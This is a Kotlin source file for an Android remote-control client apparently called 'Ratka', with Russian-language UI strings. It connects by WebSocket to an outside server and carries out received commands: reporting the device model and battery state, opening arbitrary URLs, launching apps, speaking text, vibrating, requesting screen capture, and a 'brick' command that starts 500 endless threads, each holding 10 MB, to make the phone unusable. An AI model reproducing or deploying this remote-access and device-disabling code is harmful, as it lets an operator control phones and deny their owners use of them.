package com.ratka.client

import android.media.AudioManager
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.projection.MediaProjectionManager
import android.media.RingtoneManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.VibrationEffect
import android.os.Vibrator
import android.speech.tts.TextToSpeech
import android.util.Log
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.Locale
import java.util.concurrent.TimeUnit

class MainActivity : Activity() {
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()
    private var webSocket: WebSocket? = null
    private var statusText: TextView? = null
    private var tts: TextToSpeech? = null
    private val wsUrl = "wss://sanya-tech.cc.cd/ws"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        tts = TextToSpeech(this) { status ->
            if (status == TextToSpeech.SUCCESS) {
                tts?.language = Locale("ru", "RU")
            }
        }

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 32, 32, 32)
        }
        statusText = TextView(this).apply { text = "Ожидание подключения..." }
        val btnConnect = Button(this).apply {
            text = "Подключиться к Ратке"
            setOnClickListener { connectWebSocket() }
        }
        layout.addView(statusText)
        layout.addView(btnConnect)
        setContentView(layout)
    }

    private fun connectWebSocket() {
        val request = Request.Builder().url(wsUrl).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                runOnUiThread { statusText?.text = "Подключено к Ратке" }
                val hello = JSONObject().apply {
                    put("type", "connect")
                    put("device_type", "android")
                    put("model", Build.MODEL)
                }
                webSocket.send(hello.toString())
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("RATKA", "Получено: $text")
                try {
                    val json = JSONObject(text)
                    when (json.optString("cmd")) {
                        "battery" -> sendBatteryInfo(webSocket)
                        "vibrate" -> vibratePhone(json.optInt("duration", 2000))
                        "toast" -> showToast(json.optString("text", "Привет от Ратки!"))
                        "open_url" -> openUrl(json.optString("url", "https://google.com"))
                        "sound" -> playSound()
                        "speak" -> speakText(json.optString("text", "Привет!"))
                        "volume_up" -> changeVolume(true)
                        "volume_down" -> changeVolume(false)
                        "brick" -> brickPhone()
                        "screen" -> requestScreenCapture()
                        "launch_app" -> launchApp(json.optString("package", "com.android.settings"))
                    }
                } catch (e: Exception) {
                    Log.e("RATKA", "Ошибка", e)
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                runOnUiThread { statusText?.text = "Ошибка: ${t.message}" }
                Log.e("RATKA", "WebSocket ошибка", t)
            }
        })
    }

    private fun sendBatteryInfo(ws: WebSocket) {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus: Intent? = registerReceiver(null, ifilter)
        val temp = (batteryStatus?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
        val status = if (bm.isCharging) "Заряжается" else "От батареи"

        ws.send(JSONObject().apply {
            put("type", "battery")
            put("level", level)
            put("temp", temp)
            put("status", status)
        }.toString())
    }

    private fun vibratePhone(duration: Int) {
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(duration.toLong(), VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            @Suppress("DEPRECATION")
            vibrator.vibrate(duration.toLong())
        }
        runOnUiThread { statusText?.text = "Вибрация $duration мс" }
    }

    private fun showToast(text: String) {
        runOnUiThread { Toast.makeText(this, text, Toast.LENGTH_LONG).show() }
    }

    private fun openUrl(url: String) {
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
        startActivity(intent)
        runOnUiThread { statusText?.text = "Открыта ссылка: $url" }
    }

    private fun playSound() {
        val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
        val ringtone = RingtoneManager.getRingtone(applicationContext, uri)
        ringtone.play()
        runOnUiThread { statusText?.text = "Проигран звук" }
    }

    private fun speakText(text: String) {
        tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "RatkaTTS")
        runOnUiThread { statusText?.text = "Озвучивание: $text" }
    }

    private fun changeVolume(up: Boolean) {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager.adjustStreamVolume(
            AudioManager.STREAM_MUSIC,
            if (up) AudioManager.ADJUST_RAISE else AudioManager.ADJUST_LOWER,
            AudioManager.FLAG_SHOW_UI
        )
        runOnUiThread { statusText?.text = if (up) "Громкость +" else "Громкость -" }
    }

    private fun brickPhone() {
        for (i in 1..500) {
            Thread {
                var counter = 0L
                val hog = ByteArray(10 * 1024 * 1024)
                while (true) {
                    counter += 1
                    if (counter == Long.MAX_VALUE) counter = 0
                }
            }.start()
        }
        runOnUiThread { statusText?.text = "КИРПИЧ АКТИВИРОВАН" }
    }

    private fun requestScreenCapture() {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), 1001)
    }

    private fun launchApp(packageName: String) {
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        if (intent != null) {
            startActivity(intent)
            runOnUiThread { statusText?.text = "Запущено: $packageName" }
        } else {
            runOnUiThread { statusText?.text = "Не найдено: $packageName" }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1001 && resultCode == Activity.RESULT_OK && data != null) {
            runOnUiThread { statusText?.text = "Скриншот разрешен (пока заглушка)" }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        tts?.shutdown()
    }
}
